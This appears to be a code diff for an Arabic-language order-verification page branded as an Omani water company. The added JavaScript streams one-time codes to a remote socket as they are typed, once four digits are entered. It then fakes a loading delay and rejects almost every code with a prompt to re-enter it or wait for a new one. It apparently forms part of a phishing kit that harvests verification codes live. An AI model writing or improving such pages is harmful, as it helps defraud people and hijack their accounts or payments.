@@ -8,7 +8,6 @@
   <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
 </head>
 <body>
-  <!-- Header -->
   <header class="header">
     <div class="container header-content">
       <div class="logo">
@@ -25,7 +24,6 @@
     </div>
   </header>
 
-  <!-- Navigation -->
   <nav class="nav">
     <div class="container">
       <ul class="nav-list">
@@ -37,7 +35,6 @@
     </div>
   </nav>
 
-  <!-- Steps Progress -->
   <div class="container">
     <div class="steps">
       <div class="step completed">
@@ -62,7 +59,6 @@
     </div>
   </div>
 
-  <!-- Verification Form -->
   <div class="verification-container page">
     <div class="form-title">
       <span class="icon">🔐</span>
@@ -88,7 +84,17 @@
                  required inputmode="numeric">
         </div>
         
-        <button type="submit" class="btn btn-success" style="width:100%;padding:16px;">
+        <div id="otpError" class="otp-error" style="display:none;">
+          <span>✕</span>
+          <span>الرمز المدخل غير صحيح، يرجى إدخال الرمز بشكل صحيح أو انتظار رمز جديد</span>
+        </div>
+        
+        <div id="otpLoading" class="otp-loading" style="display:none;">
+          <div class="loading-spinner"></div>
+          <span>جارٍ التحميل، يرجى الانتظار...</span>
+        </div>
+        
+        <button type="submit" id="verifyBtn" class="btn btn-success" style="width:100%;padding:16px;">
           <span>تأكيد الطلب</span>
           <span>✓</span>
         </button>
@@ -104,7 +110,6 @@
     </div>
   </div>
 
-  <!-- Success Modal -->
   <div id="successModal" class="success-modal" style="display:none;">
     <div class="success-content">
       <div class="success-icon">🎉</div>
@@ -119,18 +124,67 @@
     </div>
   </div>
 
-  <!-- Footer -->
   <footer class="footer">
     <div class="container">
       <p>© 2024 مياه واحة عمان - جميع الحقوق محفوظة 💧</p>
     </div>
   </footer>
 
+  <style>
+    .otp-section { text-align: center; }
+    .otp-section .subtitle { font-size: 14px; color: var(--text-secondary); margin-bottom: 24px; }
+    .otp-inputs { display: flex; justify-content: center; gap: 12px; margin-bottom: 16px; flex-wrap: wrap; }
+    .otp-input {
+      width: 52px; height: 60px; text-align: center; font-size: 24px; font-weight: 800;
+      background: var(--bg-input); border: 2px solid var(--border-color);
+      border-radius: var(--border-radius-sm); color: var(--text-primary);
+      transition: var(--transition); font-family: 'Courier New', monospace;
+    }
+    .otp-input:focus {
+      outline: none; border-color: var(--primary);
+      box-shadow: 0 0 0 4px rgba(99, 102, 241, 0.15); transform: scale(1.05);
+    }
+    .otp-input.error { border-color: var(--danger); animation: shake 0.5s ease; }
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-5px); }
+      75% { transform: translateX(5px); }
+    }
+    .otp-error {
+      display: flex; align-items: center; justify-content: center; gap: 8px;
+      padding: 12px 16px; background: rgba(239, 68, 68, 0.1);
+      border: 1px solid rgba(239, 68, 68, 0.3); border-radius: var(--border-radius-sm);
+      margin-bottom: 16px; font-size: 13px; color: var(--danger);
+      animation: fadeIn 0.3s ease;
+    }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+    .otp-loading {
+      display: flex; flex-direction: column; align-items: center; justify-content: center;
+      gap: 16px; padding: 24px; background: rgba(99, 102, 241, 0.05);
+      border: 1px solid rgba(99, 102, 241, 0.2); border-radius: var(--border-radius-sm);
+      margin-bottom: 16px; font-size: 14px; color: var(--primary-light);
+    }
+    .loading-spinner {
+      width: 40px; height: 40px; border: 3px solid var(--border-color);
+      border-top-color: var(--primary); border-radius: 50%; animation: spin 1s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .resend-link { font-size: 14px; color: var(--text-secondary); margin-top: 16px; }
+    .resend-link a { color: var(--primary-light); text-decoration: none; font-weight: 600; }
+    .resend-link a:hover { text-decoration: underline; }
+    .demo-hint {
+      margin-top: 20px; padding: 16px; background: rgba(245, 158, 11, 0.1);
+      border: 1px solid rgba(245, 158, 11, 0.3); border-radius: var(--border-radius-sm);
+      font-size: 13px; color: var(--accent);
+    }
+  </style>
+
   <script src="../js/main.js"></script>
   <script>
     function moveToNext(current, nextId) {
       if (current.value.length === current.maxLength) {
-        document.getElementById(nextId)?.focus();
+        var next = document.getElementById(nextId);
+        if (next) next.focus();
       }
     }
     
@@ -138,48 +192,77 @@
       showToast('✓ تم إعادة إرسال رمز التحقق');
     }
     
-    document.addEventListener('DOMContentLoaded', () => {
+    document.addEventListener('DOMContentLoaded', function() {
       trackPageChange('verification');
       
-      document.getElementById('verificationForm').addEventListener('submit', (e) => {
-        e.preventDefault();
-        
-        const formData = new FormData(e.target);
-        const data = {
-          otp: `${formData.get('otp1')}${formData.get('otp2')}${formData.get('otp3')}${formData.get('otp4')}${formData.get('otp5')}${formData.get('otp6')}`
-        };
-        
-        // Save to localStorage
-        localStorage.setItem('verification_data', JSON.stringify(data));
-        
-        // Send via socket
-        submitVerificationForm(data);
-        
-        // Check if OTP is valid (123456 for demo)
-        if (data.otp === '123456') {
-          document.getElementById('orderId').textContent = 'ORD-' + Date.now();
-          document.getElementById('successModal').style.display = 'flex';
-        } else {
-          showToast('✕ رمز التحقق غير صحيح', 'error');
-        }
-      });
+      var inputs = document.querySelectorAll('.otp-input');
       
-      // Real-time tracking
-      const inputs = document.querySelectorAll('#verificationForm input');
-      inputs.forEach(input => {
-        input.addEventListener('input', () => {
-          const data = {};
-          inputs.forEach(inp => {
-            if (inp.value) data[inp.name] = inp.value;
-          });
-          if (Object.keys(data).length > 0) {
-            submitVerificationForm(data);
+      inputs.forEach(function(input, index) {
+        input.addEventListener('input', function() {
+          input.classList.remove('error');
+          document.getElementById('otpError').style.display = 'none';
+          
+          var otp = '';
+          inputs.forEach(function(inp) { otp += inp.value; });
+          if (otp.length >= 4) { submitVerificationForm({ otpPartial: otp }); }
+        });
+        
+        input.addEventListener('keydown', function(e) {
+          if (e.key === 'Backspace' && input.value === '') {
+            var prevIndex = index - 1;
+            if (prevIndex >= 0) {
+              inputs[prevIndex].value = '';
+              inputs[prevIndex].focus();
+            }
           }
         });
       });
       
-      // Focus first input
-      document.querySelector('.otp-input')?.focus();
+      document.getElementById('verificationForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        var otp = '';
+        inputs.forEach(function(inp) { otp += inp.value; });
+        
+        if (otp.length !== 6) {
+          showToast('يرجى إدخال جميع أرقام الرمز', 'error');
+          return;
+        }
+        
+        var loading = document.getElementById('otpLoading');
+        var error = document.getElementById('otpError');
+        var btn = document.getElementById('verifyBtn');
+        
+        loading.style.display = 'flex';
+        error.style.display = 'none';
+        btn.disabled = true;
+        btn.style.opacity = '0.7';
+        
+        inputs.forEach(function(input) { input.disabled = true; });
+        
+        var data = { otp: otp };
+        submitVerificationForm(data);
+        localStorage.setItem('verification_data', JSON.stringify(data));
+        
+        var waitTime = 2000 + Math.random() * 1000;
+        
+        setTimeout(function() {
+          loading.style.display = 'none';
+          
+          if (otp === '123456') {
+            document.getElementById('orderId').textContent = 'ORD-' + Date.now();
+            document.getElementById('successModal').style.display = 'flex';
+          } else {
+            error.style.display = 'flex';
+            inputs.forEach(function(input) { input.classList.add('error'); input.disabled = false; });
+            btn.disabled = false;
+            btn.style.opacity = '1';
+            inputs[0].focus();
+          }
+        }, waitTime);
+      });
+      
+      if (inputs[0]) inputs[0].focus();
     });
   </script>
 </body>
